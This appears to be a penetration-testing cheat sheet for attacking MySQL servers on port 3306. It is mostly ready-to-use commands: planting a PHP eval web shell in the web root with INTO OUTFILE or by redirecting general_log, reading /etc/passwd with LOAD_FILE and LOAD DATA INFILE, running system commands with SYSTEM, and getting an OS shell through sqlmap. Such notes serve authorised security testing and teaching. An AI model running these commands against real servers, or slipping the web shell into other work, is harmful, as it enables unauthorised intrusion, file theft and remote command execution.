# 3306 - MySQL

## Exploiting

### CLI Write File

```sql
# Method 1: INTO OUTFILE

/* Prerequisites
1. Know the absolute path of the site
2. The secure_file_priv parameter is null (before MySQL version 5.7 it is empty by default)
3. Have write permission */

SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';
SELECT "<?php @eval($_REQUEST['exec']); ?>" INTO OUTFILE "/var/www/html/exec.php";

# Method 2: general_log

/* Prerequisites
1. The secure_file_priv parameter is null (before MySQL version 5.7 it is empty by default)
2. Have write permission */

SHOW VARIABLES LIKE '%general%';
SET GLOBAL general_log="ON";
SET GLOBAL general_log_file="/var/www/html/exec.php";
SELECT "<?php @eval($_REQUEST['exec']); ?>";
SET GLOBAL general_log="OFF";
SET GLOBAL general_log_file="/var/lib/mysql/71fa30f442ff.log";
```

### CLI Load File

```sql
# Method 1: LOAD_FILE

/* Prerequisites:
1. The secure_file_priv parameter is null (before MySQL version 5.7 it is empty by default) */

SHOW GLOBAL VARIABLES LIKE '%secure_file_priv%';
SELECT LOAD_FILE( "/etc/passwd" );

# Method 2: LOAD DATA INFILE ... INTO TABLE
USE mysql;
LOAD DATA INFILE '/etc/passwd' INTO TABLE user;
SELECT * FROM user;
```

### CLI Command Execution

```sql
# SYSTEM (MySQL version 5.x)
mysql -h <target_host> -u <username> -p <password>
SYSTEM cat /etc/passwd;
```

### sqlmap Write File

```
sqlmap -u "URL" --file-write="/path/to/local/file" --file-dest="/var/www/html/exec.php"
```

### sqlmap Get Shell

```bash
# Use sqlmap (you need to know the absolute path of website)
sqlmap -u "URL" --os-shell
```
